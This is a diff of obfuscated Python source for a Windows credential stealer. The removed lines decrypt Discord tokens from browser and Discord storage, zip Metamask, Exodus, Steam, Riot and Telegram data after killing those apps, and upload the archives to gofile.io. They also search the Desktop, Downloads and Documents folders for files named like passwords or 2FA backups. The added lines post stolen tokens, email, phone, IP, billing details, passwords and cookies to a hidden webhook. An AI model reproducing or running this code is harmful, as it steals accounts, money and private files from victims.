-def G3tD1sc0rd (OOOO0OOOO0000O000 ,OOO000OO000OOO000 ):#line:611
-    if not os .path .exists (f"{OOOO0OOOO0000O000}/Local State"):return #line:612
-    OO00OO0O00O0OO0O0 =OOOO0OOOO0000O000 +OOO000OO000OOO000 #line:614
-    O0000000O0OO00O0O =OOOO0OOOO0000O000 +"/Local State"#line:616
-    with open (O0000000O0OO00O0O ,'r',encoding ='utf-8')as O000OO0000O00OO00 :O00OO00O0O00O00OO =json_loads (O000OO0000O00OO00 .read ())#line:617
-    OOOOOOO000OO0OO00 =b64decode (O00OO00O0O00O00OO ['os_crypt']['encrypted_key'])#line:618
-    OOOOOOO000OO0OO00 =CryptUnprotectData (OOOOOOO000OO0OO00 [5 :])#line:619
-    for O00O0OO0O000OO0O0 in os .listdir (OO00OO0O00O0OO0O0 ):#line:622
-        if O00O0OO0O000OO0O0 .endswith (".log")or O00O0OO0O000OO0O0 .endswith (".ldb"):#line:624
-            for O000OO00O0O000O00 in [OO00O0O0000OOO00O .strip ()for OO00O0O0000OOO00O in open (f"{OO00OO0O00O0OO0O0}\\{O00O0OO0O000OO0O0}",errors ="ignore").readlines ()if OO00O0O0000OOO00O .strip ()]:#line:625
-                for OOO0OO000O0O00000 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O000OO00O0O000O00 ):#line:626
-                    global T0k3ns #line:627
-                    O0000O000O000OOO0 =D3kryptV4lU3 (b64decode (OOO0OO000O0O00000 .split ('dQw4w9WgXcQ:')[1 ]),OOOOOOO000OO0OO00 )#line:628
-                    if ch1ckT4k1n (O0000O000O000OOO0 ):#line:629
-                        if not O0000O000O000OOO0 in T0k3ns :#line:630
-                            T0k3ns +=O0000O000O000OOO0 #line:632
-                            upl05dT4k31 (O0000O000O000OOO0 ,OOOO0OOOO0000O000 )#line:634
-def GatherZips (OOOO00OO00OO00O00 ,OO00OOOO0OOOO00OO ,OOO0000O00000O0O0 ):#line:636
-    OO0O0OOO0O0O00000 =[]#line:637
-    for OOO0O000OOO000OOO in OOOO00OO00OO00O00 :#line:638
-        O00O0OO00O0O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O000OOO000OOO [0 ],OOO0O000OOO000OOO [5 ],OOO0O000OOO000OOO [1 ]])#line:639
-        O00O0OO00O0O0000O .start ()#line:640
-        OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:641
-    for OOO0O000OOO000OOO in OO00OOOO0OOOO00OO :#line:643
-        O00O0OO00O0O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O000OOO000OOO [0 ],OOO0O000OOO000OOO [2 ],OOO0O000OOO000OOO [1 ]])#line:644
-        O00O0OO00O0O0000O .start ()#line:645
-        OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:646
-    O00O0OO00O0O0000O =threading .Thread (target =ZipTelegram ,args =[OOO0000O00000O0O0 [0 ],OOO0000O00000O0O0 [2 ],OOO0000O00000O0O0 [1 ]])#line:648
-    O00O0OO00O0O0000O .start ()#line:649
-    OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:650
-    for O0O00OO00OO0OOO0O in OO0O0OOO0O0O00000 :#line:652
-        O0O00OO00OO0OOO0O .join ()#line:653
-    global WalletsZip ,GamingZip ,OtherZip #line:654
-    OO0OOO00O0O00000O ,OOOOO00O000O0O0O0 ,OOO0O00OOOOOO0000 ="",'',''#line:657
-    if not len (WalletsZip )==0 :#line:658
-        OO0OOO00O0O00000O =":coin:  •  Wallets\n"#line:659
-        for O0O0OOOO000OO0OOO in WalletsZip :#line:660
-            OO0OOO00O0O00000O +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:661
-    if not len (WalletsZip )==0 :#line:662
-        OOOOO00O000O0O0O0 =":video_game:  •  Gaming:\n"#line:663
-        for O0O0OOOO000OO0OOO in GamingZip :#line:664
-            OOOOO00O000O0O0O0 +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:665
-    if not len (OtherZip )==0 :#line:666
-        OOO0O00OOOOOO0000 =":tickets:  •  Apps\n"#line:667
-        for O0O0OOOO000OO0OOO in OtherZip :#line:668
-            OOO0O00OOOOOO0000 +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:669
-    O00000O0000OO0000 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:673
-    OO0OOO00OOO0OOOOO ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OO0OOO00O0O00000O}\n{OOOOO00O000O0O0O0}\n{OOO0O00OOOOOO0000}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:691
-    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOO00OOO0OOOOO ).encode (),headers =O00000O0000OO0000 )#line:692
-def ZipTelegram (O0O00OO00000O0O0O ,OOOO0OO0O00O00O0O ,OOOO0O0000OOO0OOO ):#line:695
-    global OtherZip #line:696
-    O0OOOO0OOOOOO0000 =O0O00OO00000O0O0O #line:697
-    O0O0000O0O000O00O =OOOO0OO0O00O00O0O #line:698
-    if not os .path .exists (O0OOOO0OOOOOO0000 ):return #line:699
-    subprocess .Popen (f"taskkill /im {OOOO0O0000OOO0OOO} /t /f >nul 2>&1",shell =True )#line:700
-    OO0O0000OOOOO00OO =ZipFile (f"{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip","w")#line:702
-    for OOOOOO0O0OO0O0OO0 in os .listdir (O0OOOO0OOOOOO0000 ):#line:703
-        if not ".zip"in OOOOOO0O0OO0O0OO0 and not "tdummy"in OOOOOO0O0OO0O0OO0 and not "user_data"in OOOOOO0O0OO0O0OO0 and not "webview"in OOOOOO0O0OO0O0OO0 :#line:704
-            OO0O0000OOOOO00OO .write (O0OOOO0OOOOOO0000 +"/"+OOOOOO0O0OO0O0OO0 )#line:705
-    OO0O0000OOOOO00OO .close ()#line:706
-    O0OOOOO0000OO00OO =uploadToAnonfiles (f'{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip')#line:708
-    os .remove (f"{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip")#line:709
-    OtherZip .append ([OOOO0OO0O00O00O0O ,O0OOOOO0000OO00OO ])#line:710
-def Z1pTh1ngs (OOOOOO00O0O000O0O ,OOOO0000OOOO0O000 ,OO00OO000OO00O0OO ):#line:712
-    O0O00O000O0OO0O00 =OOOOOO00O0O000O0O #line:713
-    OOO000OOOOO000000 =OOOO0000OOOO0O000 #line:714
-    global WalletsZip ,GamingZip ,OtherZip #line:715
-    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OOOO0000OOOO0O000 :#line:717
-        O0OO00OO0OOO00O0O =OOOOOO00O0O000O0O .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:718
-        OOO000OOOOO000000 =f"Metamask_{O0OO00OO0OOO00O0O}"#line:719
-        O0O00O000O0OO0O00 =OOOOOO00O0O000O0O +OOOO0000OOOO0O000 #line:720
-    if not os .path .exists (O0O00O000O0OO0O00 ):return #line:722
-    subprocess .Popen (f"taskkill /im {OO00OO000OO00O0OO} /t /f >nul 2>&1",shell =True )#line:723
-    if "Wallet"in OOOO0000OOOO0O000 or "NationsGlory"in OOOO0000OOOO0O000 :#line:725
-        O0OO00OO0OOO00O0O =OOOOOO00O0O000O0O .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:726
-        OOO000OOOOO000000 =f"{O0OO00OO0OOO00O0O}"#line:727
-    elif "Steam"in OOOO0000OOOO0O000 :#line:729
-        if not os .path .isfile (f"{O0O00O000O0OO0O00}/loginusers.vdf"):return #line:730
-        OOOO0O00OOOO0O000 =open (f"{O0O00O000O0OO0O00}/loginusers.vdf","r+",encoding ="utf8")#line:731
-        O0O00O0OO000O0O0O =OOOO0O00OOOO0O000 .readlines ()#line:732
-        O0OOO00000O0OOO0O =False #line:733
-        for OOOOOO0OO0O0OOOO0 in O0O00O0OO000O0O0O :#line:734
-            if 'RememberPassword"\t\t"1"'in OOOOOO0OO0O0OOOO0 :#line:735
-                O0OOO00000O0OOO0O =True #line:736
-        if O0OOO00000O0OOO0O ==False :return #line:737
-        OOO000OOOOO000000 =OOOO0000OOOO0O000 #line:738
-    OOO00O0O0OOOOOOO0 =ZipFile (f"{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip","w")#line:741
-    for OOO0O0O00O000OO00 in os .listdir (O0O00O000O0OO0O00 ):#line:742
-        if not ".zip"in OOO0O0O00O000OO00 :OOO00O0O0OOOOOOO0 .write (O0O00O000O0OO0O00 +"/"+OOO0O0O00O000OO00 )#line:743
-    OOO00O0O0OOOOOOO0 .close ()#line:744
-    OO0O000000OOO0OOO =uploadToAnonfiles (f'{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip')#line:746
-    os .remove (f"{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip")#line:747
-    if "Wallet"in OOOO0000OOOO0O000 or "eogaeaoehlef"in OOOO0000OOOO0O000 :#line:749
-        WalletsZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:750
-    elif "NationsGlory"in OOO000OOOOO000000 or "Steam"in OOO000OOOOO000000 or "RiotCli"in OOO000OOOOO000000 :#line:751
-        GamingZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:752
-    else :#line:753
-        OtherZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:754
-def GatherAll ():#line:757
-    ""#line:758
-    O00OOO000O00OOOOO =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:768
-    O00OOO00O0OO00O0O =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:775
-    O00OO000O000000OO =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:783
-    O0000OO0O0OO0O00O =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:784
-    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:786
-        OO00000O000OO00O0 =threading .Thread (target =getT0k3n ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [2 ]])#line:787
-        OO00000O000OO00O0 .start ()#line:788
-        Threadlist .append (OO00000O000OO00O0 )#line:789
-    for O0O0O0000O000O0OO in O00OOO00O0OO00O0O :#line:790
-        OO00000O000OO00O0 =threading .Thread (target =G3tD1sc0rd ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [1 ]])#line:791
-        OO00000O000OO00O0 .start ()#line:792
-        Threadlist .append (OO00000O000OO00O0 )#line:793
-    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:795
-        OO00000O000OO00O0 =threading .Thread (target =getP4ssw ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [3 ]])#line:796
-        OO00000O000OO00O0 .start ()#line:797
-        Threadlist .append (OO00000O000OO00O0 )#line:798
-    O00O000OOO0O0OOOO =[]#line:800
-    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:801
-        OO00000O000OO00O0 =threading .Thread (target =getC00k13 ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [4 ]])#line:802
-        OO00000O000OO00O0 .start ()#line:803
-        O00O000OOO0O0OOOO .append (OO00000O000OO00O0 )#line:804
-    threading .Thread (target =GatherZips ,args =[O00OOO000O00OOOOO ,O00OO000O000000OO ,O0000OO0O0OO0O00O ]).start ()#line:806
-    for OO0O00OO00OO000OO in O00O000OOO0O0OOOO :OO0O00OO00OO000OO .join ()#line:809
-    OOOO000O00OOO0000 =TR6st (C00k13 )#line:810
-    if OOOO000O00OOO0000 ==True :return #line:811
-    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:813
-         threading .Thread (target =Z1pTh1ngs ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [5 ],O0O0O0000O000O0OO [1 ]]).start ()#line:814
-    for O0O0O0000O000O0OO in O00OO000O000000OO :#line:816
-         threading .Thread (target =Z1pTh1ngs ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [2 ],O0O0O0000O000O0OO [1 ]]).start ()#line:817
-    threading .Thread (target =ZipTelegram ,args =[O0000OO0O0OO0O00O [0 ],O0000OO0O0OO0O00O [2 ],O0000OO0O0OO0O00O [1 ]]).start ()#line:819
-    for OO0O00OO00OO000OO in Threadlist :#line:821
-        OO0O00OO00OO000OO .join ()#line:822
-    global upths #line:823
-    upths =[]#line:824
-    for OOOO00O0O0OO000O0 in ["crpassw.txt","crcook.txt"]:#line:826
-        upload (OOOO00O0O0OO000O0 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OOOO00O0O0OO000O0 ))#line:828
-def uploadToAnonfiles (OOO0O0OO0000OO0O0 ):#line:830
-    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (OOO0O0OO0000OO0O0 ,'rb')}).json ()["data"]["downloadPage"]#line:831
-    except :return False #line:832
-def KiwiFolder (O0O0OO00O0O0OOOO0 ,OO0OOOO0OOO0OO000 ):#line:834
-    global KiwiFiles #line:835
-    O0O000O00OO0OO0O0 =7 #line:836
-    OO0OO00O0O000O00O =0 #line:837
-    OOOO0O0O0O0OO00O0 =os .listdir (O0O0OO00O0O0OOOO0 )#line:838
-    O0OO0O0O0OOOOO000 =[]#line:839
-    for OOOO0OOO0000O000O in OOOO0O0O0O0OO00O0 :#line:840
-        if not os .path .isfile (O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O ):return #line:841
-        OO0OO00O0O000O00O +=1 #line:842
-        if OO0OO00O0O000O00O <=O0O000O00OO0OO0O0 :#line:843
-            O0O0OOO0OO00O0OO0 =uploadToAnonfiles (O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O )#line:844
-            O0OO0O0O0OOOOO000 .append ([O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O ,O0O0OOO0OO00O0OO0 ])#line:845
-        else :#line:846
-            break #line:847
-    KiwiFiles .append (["folder",O0O0OO00O0O0OOOO0 +"/",O0OO0O0O0OOOOO000 ])#line:848
-KiwiFiles =[]#line:850
-def KiwiFile (O0O000O0OOO0OO000 ,OOO0OOO00O0OO000O ):#line:851
-    global KiwiFiles #line:852
-    O000O00OO0OO0O0OO =[]#line:853
-    O00OO0000O00O0O00 =os .listdir (O0O000O0OOO0OO000 )#line:854
-    for OOO0000O0OO00000O in O00OO0000O00O0O00 :#line:855
-        for O0O00OOOOOO00OOO0 in OOO0OOO00O0OO000O :#line:856
-            if O0O00OOOOOO00OOO0 in OOO0000O0OO00000O .lower ():#line:857
-                if os .path .isfile (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O )and ".txt"in OOO0000O0OO00000O :#line:858
-                    O000O00OO0OO0O0OO .append ([O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O ,uploadToAnonfiles (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O )])#line:859
-                    break #line:860
-                if os .path .isdir (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O ):#line:861
-                    OOO0OOO00O0OOOOO0 =O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O #line:862
-                    KiwiFolder (OOO0OOO00O0OOOOO0 ,OOO0OOO00O0OO000O )#line:863
-                    break #line:864
-    KiwiFiles .append (["folder",O0O000O0OOO0OO000 ,O000O00OO0OO0O0OO ])#line:866
-def Kiwi ():#line:868
-    OO0OO0O00O00O0O00 =temp .split ("\AppData")[0 ]#line:869
-    OO0O0OOO0OOOO000O =[OO0OO0O00O00O0O00 +"/Desktop",OO0OO0O00O00O0O00 +"/Downloads",OO0OO0O00O00O0O00 +"/Documents"]#line:874
-    O0OOO00O0OO0OOOOO =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:902
-    OOOO0OOOOOO000O0O =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:930
-    O0OOO000O0O000OOO =[]#line:932
-    for O0O0OO00OO000000O in OO0O0OOO0OOOO000O :#line:933
-        O00O0OO0O00OO00O0 =threading .Thread (target =KiwiFile ,args =[O0O0OO00OO000000O ,OOOO0OOOOOO000O0O ]);O00O0OO0O00OO00O0 .start ()#line:934
-        O0OOO000O0O000OOO .append (O00O0OO0O00OO00O0 )#line:935
-    return O0OOO000O0O000OOO #line:936
-global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:939
-keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:943
-CookiCount ,P4sswCount =0 ,0 #line:945
-cookiWords =[]#line:946
-paswWords =[]#line:947
-WalletsZip =[]#line:949
-GamingZip =[]#line:950
-OtherZip =[]#line:951
-GatherAll ()#line:953
-DETECTED =TR6st (C00k13 )#line:954
-if not DETECTED :#line:956
-    wikith =Kiwi ()#line:957
-    for thread in wikith :thread .join ()#line:959
-    time .sleep (0.2 )#line:960
-    filetext ="\n"#line:962
-    for arg in KiwiFiles :#line:963
-        if len (arg [2 ])!=0 :#line:964
-            foldpath =arg [1 ]#line:965
-            foldlist =arg [2 ]#line:966
-            filetext +=f"📁 {foldpath}\n"#line:967
-            for ffil in foldlist :#line:969
-                a =ffil [0 ].split ("/")#line:970
-                fileanme =a [len (a )-1 ]#line:971
-                b =ffil [1 ]#line:972
-                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:973
-            filetext +="\n"#line:974
+def upl05dT4k31 (OO0OOOO0O0OOO00O0 ,O0O00OO00OOO00OOO ):#line:304
+    global IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO #line:305
+    O000000O0O00OOO0O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:309
+    O0OO0O000OOO0OOOO ,OOOOO0O00O000000O ,OO0O00O0O0O00O0OO ,OOO0OO0O00OOOO0OO ,O0O0OO00O0O0O00O0 ,O0OO0000O00OO0O00 ,O0O00O00000OOO000 ,O0O0O0OO000OOO00O =G3tT0k4n1nf9 (OO0OOOO0O0OOO00O0 )#line:310
+    if O0O0OO00O0O0O00O0 ==None :#line:312
+        O0O0OO00O0O0O00O0 =""#line:313
+    else :#line:314
+        O0O0OO00O0O0O00O0 =f"https://cdn.discordapp.com/avatars/{OOO0OO0O00OOOO0OO}/{O0O0OO00O0O0O00O0}"#line:315
+    O0OO00000O000OO0O =G3tb1ll1ng (OO0OOOO0O0OOO00O0 )#line:317
+    OOOO0OOOO0000O0O0 =G3tB4dg31 (O0OO0000O00OO0O00 )#line:318
+    O0OO0OOO00O0000O0 =G3tUHQFr13ndS (OO0OOOO0O0OOO00O0 )#line:319
+    if O0OO0OOO00O0000O0 =='':O0OO0OOO00O0000O0 ="```No Rare Friends```"#line:320
+    if not O0OO00000O000OO0O :#line:321
+        OOOO0OOOO0000O0O0 ,O0O0O0OO000OOO00O ,O0OO00000O000OO0O ="🔒","🔒","🔒"#line:322
+    if O0O00O00000OOO000 ==''and OOOO0OOOO0000O0O0 =='':O0O00O00000OOO000 ="```None```"#line:323
+    O000O00O0OOOO00OO ={"content":f'{globalInfo()} | `{O0O00OO00OOO00OOO}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OO0OOOO0O0OOO00O0}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{OO0O00O0O0O00O0OO}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{O0O0O0OO000OOO00O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{O0O00O00000OOO000}{OOOO0OOOO0000O0O0}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O0OO00000O000OO0O}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{O0OO0OOO00O0000O0}","inline":False }],"author":{"name":f"{O0OO0O000OOO0OOOO}#{OOOOO0O00O000000O} ({OOO0OO0O00OOOO0OO})","icon_url":f"{O0O0OO00O0O0O00O0}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{O0O0OO00O0O0O00O0}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:383
+    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (O000O00O0OOOO00OO ).encode (),headers =O000000O0O00OOO0O )#line:384
+def R4f0rm3t (O00000OOOO000O000 ):#line:387
+    OOO00OO000O00O00O =re .findall ("(\w+[a-z])",O00000OOOO000O000 )#line:388
+    while "https"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("https")#line:389
+    while "com"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("com")#line:390
+    while "net"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("net")#line:391
+    return list (set (OOO00OO000O00O00O ))#line:392
+def upload (O00OO0O0O0O00000O ,OO00O00O0O00000OO ):#line:394
+    O0O000OO0000O000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:398
+    if O00OO0O0O0O00000O =="crcook":#line:400
+        O00O0O000OO00OO00 =' | '.join (OOOO0OO0O00O0OOOO for OOOO0OO0O00O0OOOO in cookiWords )#line:401
+        if len (O00O0O000OO00OO00 )>1000 :#line:402
+            O0O0OOO000000OOO0 =R4f0rm3t (str (cookiWords ))#line:403
+            O00O0O000OO00OO00 =' | '.join (OO0O0O00O000000O0 for OO0O0O00O000000O0 in O0O0OOO000000OOO0 )#line:404
+        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O00O0O000OO00OO00}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({OO00O00O0O00000OO})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:421
+        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:422
+        return #line:423
+    if O00OO0O0O0O00000O =="crpassw":#line:425
+        OOOO0OOOOO0O0OOO0 =' | '.join (OOO0OO00O00O0OO0O for OOO0OO00O00O0OO0O in paswWords )#line:426
+        if len (OOOO0OOOOO0O0OOO0 )>1000 :#line:427
+            OOOO00O00000OOO00 =R4f0rm3t (str (paswWords ))#line:428
+            OOOO0OOOOO0O0OOO0 =' | '.join (O0O0OOO0000O0O0O0 for O0O0OOO0000O0O0O0 in OOOO00O00000OOO00 )#line:429
+        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OOOO0OOOOO0O0OOO0}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({OO00O00O0O00000OO})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:447
+        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:448
+        return #line:449
+    if O00OO0O0O0O00000O =="kiwi":#line:451
+        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":OO00O00O0O00000OO }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:475
